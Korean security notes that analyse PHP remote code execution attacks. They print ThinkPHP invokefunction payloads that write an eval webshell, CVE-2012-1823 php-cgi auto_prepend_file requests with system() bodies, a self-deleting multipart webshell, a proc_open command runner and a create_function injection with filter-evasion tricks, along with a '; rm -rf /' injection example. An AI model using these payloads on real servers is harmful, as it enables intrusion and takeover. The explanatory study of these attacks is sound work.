## 🥞 **PHP Code Injection / Remote Code Execution** 예제

### A. 업로드 → 웹루트에 `.php`로 저장 → Stored WebShell 

취약한 `up.cgi`가 `uploads/`에 `$_FILES['file']['name']` 그대로 저장하고 `uploads/`가 웹에서 PHP를 실행하도록 설정되어 있으면 RCE.

취약점 흐름:

* POST로 `shell.php`(내용: `<?php ... ?>`) 업로드 → `/uploads/shell.php` 생성 → `GET /uploads/shell.php` 요청 → 서버가 PHP 해석 → 공격자 명령 실행.

### B. 파일명 경로 조작 → 디렉토리 트래버설

업로드 핸들러가 파일명을 `../../www/some.php`처럼 조작해서 의도한 위치(예: 웹루트)로 쓰도록 허용하면 RCE.

### C. 쉘 명령 인젝션

업로드 핸들러가 `system("mv $tmp $dest");` 처럼 외부 입력($dest)에 검증 없이 넣으면 `; rm -rf /` 같은 인젝션 가능.

### D. 로그 포이즈닝 + LFI

* 공격자가 로그(예: access.log)에 `<?php ... ?>`를 주입하고, 어딘가 LFI 취약점이 있으면 `include('/var/log/apache2/access.log')`로 인해 코드 실행 가능.


### E. 그 외 

* **흔한 주입 경로**

  * 파일 업로드 취약점(확장자/확장자 검증 실패)
  * LFI(Local File Inclusion) 취약점을 통한 로그/업로드 파일 포함
  * 취약한 플러그인/테마(특히 워드프레스)
  * 미스컨피규어된 eval/인클루드 사용 코드

---


## 📎 예제 1. ThinkPHP `invokefunction` POC (MD5 페이로드)


```
https://www.example.com/index.php?s\=/Index/\\think\\app/invokefunction&function\call_user_func_array&vars[0]\=file_put_contents&vars[1][]\=index_bak.php&vars[1][]\=<?php%20@eval($_POST['pwd']);?>hello
```

* `index.php?s\=/Index/\\think\\app/invokefunction`

  * `s=/Index/\\think\\app/invokefunction` 은 ThinkPHP 프레임워크의 내부 라우팅 / 디버그 엔드포인트를 직접 호출하려는 구조입니다. 공격자 의도: 프레임워크의 내부 함수(invokefunction)를 호출해서 임의 함수 실행.
  * 백슬래시(`\\`)는 namespacing/escape로 보이며, 실제 서버 쪽에서 어떻게 디코딩되는지가 중요합니다.

* `&function\ll_user_func_array`

  * `call_user_func_array`(PHP 표준 함수)는 첫번째 인수에 호출할 함수(예: `file_put_contents`), 두번째 인수에 인수 배열을 받아 **임의 함수 호출**을 가능하게 합니다.

* `&vars[0]=file_put_contents`

  * 호출하려는 함수: `file_put_contents` — 파일을 생성/쓰기하는 PHP 표준 함수. 즉 목적은 파일 생성(웹셸 저장).

* `&vars[1][]=index_bak.php`

  * `file_put_contents`의 첫 번째 인자(파일명) — 웹서버가 접근 가능한 경로(웹루트)에 index_bak.php로 생성되면 곧바로 웹에서 실행 가능해질 수 있습니다.

* `&vars[1][]=<?php%20@eval($_POST['pwd']);?>hello`

  * `file_put_contents`의 두번째 인자(파일 내용). URL 인코딩: `%20` → 공백. 실제 내용은:

    ```
    <?php @eval($_POST['pwd']);?>hello
    ```
  * `<?php @eval($_POST['pwd']);?>` : 전형적인 POST-based 웹셸. 공격자가 이후 `POST`로 `pwd` 파라미터에 PHP 코드를 넣어 서버에서 실행하게 함.
  * `hello` : 흔히 쓰이는 “마커”(fingerprint) — 파일이 실제로 생성됐는지 확인하려는 식별자.
 
<br>
### 🐻‍❄️ 아래 페이로드도 `임의 함수 호출(POC)`

```
/?s=../\think\Container/invokefunction
&function=call_user_func_array
&vars[0]=md5
&vars[1][]=HelloThinkPHP
```

* 의도: 내부에서 `call_user_func_array('md5', ['HelloThinkPHP'])` 실행 유도 → 응답으로 MD5가 나오면 호출 성공.


### 완전한 RCE가 되려면 

1. 공격자가 `vars[0]` 등으로 `system`, `exec`, `shell_exec`, `eval` 등을 지정할 수 있어야 함
2. 서버/프레임워크가 **함수명 검증(화이트리스트)** 또는 **disable_functions** 같은 보호를 하지 않을 것
3. 함수 실행 결과가 외부로 노출되거나 파일 쓰기/명령 실행이 가능할 것


---

## 📎 예제 1-1. ThinkPHP 내부 메서드 호출
엔드포인트가 **임의 함수 호출/입력 필터링 취약**이 있는지 탐지(예: ajax.do 와 같은 파일 경로에서)
응답에 `okhacked`가 포함되면 성공 확인, 이후 추가로 민감정보(설정파일, 소스코드)를 수집하거나 RCE로 확장 가능

```
s\=/index/\\think\\Request/input&filter\=var_dump&data\d3e827b198d120okhacked
```


* `s=/index/\think\Request/input`

  * `s` 파라미터는 ThinkPHP 계열(및 일부 PHP 프레임워크)의 라우팅/펑션 호출 파라미터로 악용되는 경우가 많습니다.
  * `\think\Request`는 PHP 네임스페이스 표기(백슬래시) — 로그/URL에선 `\\` 또는 이스케이프 형태로 기록될 수 있습니다.
  * 전체적으로는 `\think\Request::input()` 같은 내부 메서드(또는 해당 경로의 컨트롤러/함수)에 접근하려는 시도로 해석됩니다. 즉, **내부 함수/메서드를 직접 호출하려는 의도**.

* `filter=var_dump`

  * 공격자는 서버 측에서 **전달된 값에 `var_dump`를 적용하게 만들려 함**. 즉, 서버가 `filter` 파라미터를 곧바로 함수명으로 취급해 `filter(data)` 처럼 호출하는 취약한 처리 로직을 노린 것입니다. 성공하면 서버가 `var_dump()` 결과를 그대로 응답에 출력합니다(정보 노출 확인용).

* `data=d3e827b198d120okhacked`

  * `data`는 호출될 입력값. `okhacked` 같은 문자열은 **성공 판별자**(attacker marker)로 흔히 사용됩니다.
  * `d3e827b198d120`처럼 보이는 부분은 페이로드 식별자(해시/토큰)거나 단순 랜덤 문자열일 가능성이 큽니다.

요약하면: 공격자는 `s` 파라미터로 내부 함수(또는 메서드)를 호출하고, `filter` 파라미터로 `var_dump`를 강제로 적용해 `data` 내용을 서버 응답으로 받아보려는 **정보 노출 / 취약성 탐지** 시도를 했습니다.


### 공격 메커니즘

* **취약한 처리**: 애플리케이션이 `s`를 내부 경로 호출로, `filter`를 함수 호출로 검증 없이 직접 사용한다면 사용자가 임의의 PHP 함수(예: `var_dump`, `system`, `eval` 등)를 실행하게 할 수 있습니다.
* **정보 유출**: `var_dump`가 성공하면 파일 내용, 변수 값, 객체 구조 등 민감 정보가 응답에 포함될 수 있음 → DB 자격증명·설정파일 노출 가능.
* **RCE 체인 가능성**: 만약 `filter`로 `assert`나 `eval` 같은 함수가 호출 가능하면 원격 코드 실행(RCE)으로 이어질 수 있음.
* **php://filter 결합**: `php://filter/convert.base64-encode/resource=...` 같이 사용하면 파일의 소스(코드)를 base64로 읽어 응답에 반환할 수 있어 설정파일(DB 접속 문자열) 탈취에 아주 흔히 쓰입니다.
  

---
## 📎 예제 2. php-cgi(또는 php-cgi.exe) 취약점/오용을 이용한 원격코드실행(RCE)

**php-cgi(또는 php-cgi.exe)** 를 통해 PHP 런타임 설정을 조작해서 `php://input`(요청 바디)을 PHP 코드로 실행하게 만드는 기법.
php-cgi는 PHP 인터프리터의 CGI(Common Gateway Interface) 실행 파일로, PHP 코드를 해석·실행하는 프로그램 중 하나.

1. **php-cgi 바이너리가 외부에서 CGI 방식으로 직접 접근 가능**해야 함 (`/cgi-bin/php-cgi` 등).
2. 서버가 쿼리스트링의 `-d` 인자(또는 유사 설정)를 **실제로 처리/허용**해야 함(패치/설정으로 차단되지 않아야 함).
3. 요청의 쿼리스트링에 `-d auto_prepend_file=php://input`(또는 유사 지시문)이 **정확히 포함**되어야 함.
4. 요청 바디(POST) 에 **실행 가능한 PHP 코드**(예: `<?php ... ?>`)가 포함되어야 하고, 서버가 그 내용을 실행하도록 설정 변경이 가능해야 함.
5. WAF/방화벽/서버 설정이 요청을 차단하지 않아야 함.


### 페이로드 예시

HTTP GET 요청(쿼리 인코딩된 형태):

```
GET /cgi-bin/php-cgi.exe?-d+allow_url_include=1+-d+auto_prepend_file=php://input HTTP/1.1
Host: victim.com
...
```

그리고 바로 뒤에 POST 바디(요청 바디)에 실행할 PHP 코드:

```
<?php system($_GET['cmd']); ?>
```

또는 POC 단순 확인용:

```
<?php echo 'RCE_OK_12345'; ?>
```

이렇게 구성되면 php-cgi가 `auto_prepend_file=php://input`을 적용하여 요청 바디의 PHP 코드를 자동으로 포함·실행하게 되고, 응답 바디에 `RCE_OK_12345` 같은 토큰이 보이면 성공을 의미합니다

* URL은 반드시 올바르게 URL-인코딩 (예: `-d+auto_prepend_file=php://input` → `-d%20auto_prepend_file%3Dphp%3A%2F%2Finput`)


---

## 📎 예제 2-1. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)

공격자가 웹 서버에 **악성 PHP 코드**를 삽입하고 실행

```
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
```

### 디코딩하면:

```
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input
```

> `%AD`는 실제로는 **하이픈(-)** 의 잘못된 인코딩 (`-d`), `%3d`는 `=`를 의미.

이 요청은 PHP 인터프리터에게 다음을 강제로 전달하려는 시도입니다:

| 파라미터                               | 설명                               |
| ---------------------------------- | -------------------------------- |
| `-d allow_url_include=1`           | PHP 설정을 동적으로 바꿔서 외부 URL 포함 허용    |
| `-d auto_prepend_file=php://input` | 요청 본문에 포함된 코드를 PHP 파일처럼 실행하겠다는 뜻 |


### 실제 공격 흐름

```http
POST /hello.world?-d allow_url_include=1 -d auto_prepend_file=php://input HTTP/1.1
Content-Type: text/plain

<?php system('id'); ?>
```

➡️ 공격자는 **PHP 설정을 강제로 우회해서** POST 요청 본문에 PHP 코드를 넣고 그걸 실행하도록 만듦
이 요청이 성공하면, **`id` 명령이 서버에서 실행되고**, 결과가 응답으로 돌아옵니다.
결국 공격자는 원격에서 시스템 명령을 자유롭게 실행할 수 있게 됩니다.


### 🔥 전형적인 PHP CGI 취약점 공격

이건 **CVE-2012-1823**라는 취약점을 기반으로 한 **PHP-CGI 명령어 인젝션** 공격입니다.
CGI 방식으로 PHP가 실행될 때 쿼리스트링에서 ini 설정을 허용하는 구성이 있을 경우 악용 가능합니.

### 관련 정보:

| 항목      | 내용                                                    |
| ------- | ----------------------------------------------------- |
| 취약점     | **CVE-2012-1823**                                     |
| 영향받는 환경 | PHP가 CGI 모드로 동작하며, 웹서버가 `query string`을 해석하지 않고 넘길 경우 |
| 결과      | 공격자가 임의 PHP 설정 추가 (`-d`), 코드 실행 가능 (`php://input`)    |
| 피해      | 완전한 서버 탈취 가능 (웹쉘 업로드 등)                               |

---

## 📎 예제 2-2. php-cgi RCE (`php-cgi` Query String `-d` 인젝션 취약점)

```
https://www.we.net/php-cgi/php-cgi.exe?
-d cgi.force_redirect=0 
-d cgi.redirect_status_env 
-d allow_url_include=1 
-d auto_prepend_file=php://input
```

`-d` 옵션은 PHP 실행 시 ini 설정을 커맨드라인에서 덮어쓰는 옵션입니다. CGI 환경에서 취약하게 설정된 경우, 공격자는 **쿼리스트링으로 `-d` 옵션을 전달**해 런타임 ini 값을 변경할 수 있습니다. 

* `cgi.force_redirect=0` — 일부 보호 메커니즘을 비활성화해 직접 CGI 실행을 허용하게 함(취약 환경에서 필요).
* `allow_url_include=1` — 원격 URL 포함 허용(위험).
* `auto_prepend_file=php://input` — PHP가 스크립트를 실행하기 전에 HTTP 본문(POST 바디)을 포함하도록 설정. 즉, 공격자는 POST 몸체에 PHP 코드를 넣으면 그 코드가 자동으로 포함되어 실행됩니다.

공격자는 이 GET(또는 GET+POST) 요청으로 PHP 런타임 설정을 바꾸고 **POST 본문에 담긴 PHP 코드가 곧바로 실행되게** 만들어 RCE를 달성하려 합니다.

1. 공격자가 `php-cgi.exe? -d ... auto_prepend_file=php://input` 형태로 요청 보냄.
2. 웹서버가 해당 php-cgi를 CGI로 실행하면서 `-d` 파라미터를 적용(취약한 설정이면).
3. 공격자는 같은 요청에서 POST 바디에 `<?php system($_GET['cmd']); ?>` 같은 PHP 페이로드를 넣음.
4. PHP가 요청을 처리할 때 `php://input` (POST body)을 자동 포함 → 페이로드가 실행됨 → RCE 달성.
5. 공격 완료 후 흔적 제거(예: unlink 같은 PHP 명령)도 가능.

---


## 📎 예제 2-3. php-cgi : 파일 업로드/POST(멀티파트)형태로 PHP 코드(웹셸) 전송

```
,<?php echo md5('999999999'); unlink(__FILE__); ?> 
-----------------------------5825462663702204104870787337-- 
/api/hassio/app/../supervisor/info
/setup/setup-s/../../log.jsp
```

* `<?php ... ?>` — PHP 코드. 관리자 페이지나 업로드된 파일이 PHP로 해석되면 **코드 실행**.
* `echo md5('999999999')` — *실행 확인용(증거 표시) 페이로드*. 공격자는 실행 결과(특정 해시값)를 보고 “코드가 실행되었다”를 확인하려 함.
* `unlink(__FILE__)` — 자신(업로드된 파일)을 삭제해서 흔적을 지우려는 동작.
* `-----------------------------...--` — multipart/form-data 바운더리(업로드 요청의 끝).
* `/api/hassio/...`, `/setup/.../../../log.jsp` — 추가적인 경로 탐색/트래버설 시도(내부 엔드포인트·로그 파일 접근 시도).


1. **멀티파트 POST로 파일 업로드(또는 필드에 코드 주입)**

   * boundary와 `<?php ... ?>` 조합은 “파일 업로드(body에 들어있는 파일 또는 필드)에 PHP 코드 삽입”을 의미합니다.
     
2. **업로드 파일이 웹 접근 가능한 위치에 저장되면**

   * 공격자는 그 업로드된 파일(예: `http://friend.com/uploads/a.php`)을 GET 요청해 PHP 코드를 실행시키려 시도합니다.
   * `echo md5('999999999')` 출력이 보이면 공격자는 “실행 확인” -> 그 값이 로그/응답에 남으면 성공으로 판단.
     
3. **실행 후 흔적 지우기**

   * `unlink(__FILE__)`로 자기 자신을 삭제하여 업로드된 웹쉘 파일을 지운 뒤에도 이미 실행된 공격 작업(예: 명령·백그라운드 작업)은 남아있을 수 있음.
     
4. **동시에 다른 경로 스캐닝/트래버설 시도**

   * `/api/hassio/app/../supervisor/info` 등은 내부 엔드포인트(정보 노출 가능)를 탐색하려는 시도.
   * `/setup/.../../../log.jsp`는 상위 디렉터리 접근을 통해 로그/설정 파일을 읽어보려는 시도(혹은 기존 취약점 유무 확인).
     


### RCE가 되는 경우 

1. **up.cgi가 업로드된 파일을 웹 루트(또는 PHP가 해석되는 위치)에 그대로 저장**하고 그 파일이 `.php` 등으로 접근 가능하면 → 업로드된 PHP가 HTTP로 호출될 때 서버가 그 PHP를 해석하여 **코드 실행(Stored RCE)** 발생.
2. **up.cgi가 업로드된 입력(또는 파라미터 값)을 `system()`/`exec()` 같은 쉘 호출에 검증 없이 넣는 경우** → 명령 인젝션 → RCE.
3. **업로드 후 바로 include/require 하거나 템플릿 엔진에 그대로 넣어 서버에서 해석되게 하는 경우** → 템플릿 인젝션 → RCE.
4. **서버에 오래된 Bash 취약점 같은 외부 런타임 취약점이 존재**하면 환경변수/페이로드를 통해 원격 실행 가능.
   

---

## 📎 예제 3. PHP 코드의 proc_open을 이용한 시스템 명령 RCE

서버에서 명령을 실행(proc_open)하고 결과를 HTTP로 돌려주는 전형적인 원격 명령 실행(RCE) / 웹쉘 설치 시도
proc_open 페이로드(원격 명령 실행 시도)와 eval_stdin.php가 함께 발견되면 공격자는 서버에서 원격으로 코드를 보내 eval()로 실행시키는 체계를 구축
 * eval_stdin.php 이름으로 짐작되는 파일은 보통 php://stdin 또는 요청 바디를 eval()로 실행하도록 만든 웹쉘/원격 코드 실행 러너입니다.

```php
<?php
$sp2b9876 = proc_open(
    'uname -a',
    array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'r')
    ),
    $sp71a4e7
);
echo stream_get_contents($sp71a4e7[1]);
?>
```

* `<?php ... ?>`
  PHP 코드 블록 — 웹서버가 이 파일을 해석하면 코드가 실행됩니다.

* 변수명 (`$sp2b9876`, `$sp71a4e7`)
  무작위화된 변수명(난독화 시도). 공격자는 흔히 랜덤 이름을 써서 탐지를 피하려 합니다.

* `proc_open(command, descriptorspec, &pipes)`

  * **기능**: 새로운 프로세스를 생성하고 표준 입출력 스트림(stdin/stdout/stderr)을 파이프에 연결합니다.
  * `command`: 여기서는 `'uname -a'` — 리눅스/유닉스 시스템 정보를 출력하는 명령. 공격자는 보통 권한·환경 확인용으로 이런 명령부터 실행합니다.
  * `descriptorspec`: 0(stdin), 1(stdout), 2(stderr)에 대한 설정. `array('pipe', 'r')` 은 읽기/쓰기 파이프 연결을 뜻합니다.
  * `$sp71a4e7`(참조로 전달): 생성된 파이프(리소스 핸들)들이 이 변수에 채워집니다. 예: `$sp71a4e7[0]` = 쓰기용(프로세스 stdin), `[1]` = 읽기용(stdout), `[2]` = 읽기용(stderr).

* `stream_get_contents($sp71a4e7[1])`

  * `$sp71a4e7[1]`(stdout 파이프)에서 출력된 모든 내용을 읽습니다. 결국 `uname -a`의 출력(커널 명/버전 등)을 읽어 `echo`로 응답에 쏩니다.

* `echo`

  * 실행 결과를 HTTP 응답 본문으로 출력 — 공격자는 이렇게 서버에서 명령을 실행하고 결과를 원격으로 확인합니다.


### 📌 변형/유사 페이로드 (공격자들이 자주 쓰는 다른 함수들)

* `system('command')`, `exec('command', $out)`, `shell_exec('command')`, `` `command` `` (백틱), `popen()`, `passthru()`
* `proc_open`은 더 정교한 I/O 제어가 가능해서 선호되기도 함.


---
## 📎 예제 3-1. PHP 구버전의  `create_function`과 `usort()` 을 통한 RCE

서버가 입력값을 **eval, include, unserialize, preg\_replace** 등으로 실행하게 만들어서
**임의 코드 실행** → **웹쉘 삽입** → **시스템 장악**

```txt
tag/index=&tag={
  pbohome/Indexot:if(1)(
    usort(
      post(1),
      create_function(
        post(2),
        post(3)
      )
    )
  );
}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue
```

(※ `%7B`, `%7D` → `{`, `}`,
`/*%3e*/` → `/*>*/` 로 변형해 난독화된 상태)


### 1. **`create_function` 사용**

```php
create_function(post(2), post(3))
```

* 이는 PHP의 오래된 함수로, 문자열 형태의 코드를 함수로 생성할 수 있음.
* PHP 7.2 이후 제거되었지만, **구버전에서는 치명적인 RCE 수단**으로 쓰임.

### 2. **`usort(post(1), ..., ...)`**

* `usort()`은 배열 정렬 함수인데, 콜백 함수에 **임의 코드 실행을 유도**할 수 있음.
* `post(n)` 구조는 공격자가 자신이 원하는 데이터를 POST로 넘기겠다는 의미일 수 있음.

### 3. **난독화 (`/*%3e*/`, 중첩 괄호, `tag=` 파라미터 활용 등)**

* 필터 우회를 위해 일부 문자들을 주석 처리하거나 인코딩
* 예: WAF가 `create_function`을 막더라도 `cre/*>*/ate_function`처럼 쪼개면 우회 가능


